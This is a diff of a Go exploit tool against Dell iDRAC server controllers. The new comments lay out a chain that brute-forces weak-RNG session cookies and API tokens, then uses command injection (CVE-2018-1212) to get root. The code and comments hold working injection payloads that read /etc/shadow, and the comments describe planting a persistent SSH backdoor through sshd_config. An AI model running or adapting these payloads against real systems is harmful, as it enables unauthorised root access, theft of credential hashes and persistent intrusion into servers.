@@ -4,9 +4,15 @@
  AKA Raiders of the Lost Drac
  AKA A short presentation on webapp security and practical cryptanalysis
 
- Caveats: The admin needs to create a new session while we're observing.
- Once an admin logs in, it's pretty much a matter of time. No really, that's pretty
- much the only "R"NG seed value. And it tells us that in the Date header.
+ the attack works as follows:
+ - each site visitor is assigned a session cookie.
+ - the session cookie is the hash of a static pointer value, a timestamp in seconds and a counter.
+ - by locally bruteforcing our sessionid, we can recover the seed values for the remote rng.
+ - by periodically observing the counter value in the remote rng, we can determine if a new session has been assigned and efficiently guess their cookie.
+ - we use an oracle to determine if a session cookie is associated with an authenticated session (e.g. has logged in).
+ - a second weak rng assigns two tokens to the authenticated session, for use with API requests.
+ - we use an oracle to efficiently bruteforce the token values, which are generated from a process id, a timestamp and another counter.
+ - once we have obtained valid tokens (5-30 mins) we attack one of two remote command execution vulnerabilities to obtain a root shell.
 */
 
 package main
@@ -141,9 +147,10 @@ func tokenFromSeed(seed uint32) string {
 }
 
 /*
- this page will return 200 if our ST2 token is valid. it will also execute our code as root.
+ if CVE-2018-1212 is patched, use the following. i believe this is still unpatched.
+
  POST /data?set=remoteFileshrUser:user,remoteFileshrPwd:%60cat%20%2fetc%2fshadow%60,remoteFileshrImage:%2F%2F127.0.0.1%2Frootme,remoteFileshrAction:1
- this is also a suitable target, however it is blind.
+
  to add persistent root access add the following to /etc/ssh/sshd_config by command injection
 
 AuthorizedKeysFile      /etc/ssh/.backdoor
@@ -169,7 +176,7 @@ $ ls -l /sbin/tcpdump
 
 */
 func (h *HiDrac) SecureTokenOracle(st2, sid string) (bool, string) {
-	url := fmt.Sprintf("https://%s/data?get=diagPing(1.1.1.1|bash%%20-c%%20'cat%%20/etc/shadow')", h.Ip) // there's another command injection which isn't patched too ...
+	url := fmt.Sprintf("https://%s/data?get=diagPing(1.1.1.1|bash%%20-c%%20'cat%%20/etc/shadow')", h.Ip) // CVE-2018-1212 https://nvd.nist.gov/vuln/detail/CVE-2018-1212
 	req, e := http.NewRequest("POST", url, nil)
 	if e != nil {
 		log.Printf("st oracle probe of '%s' failed: %s\n", h.Ip, e)
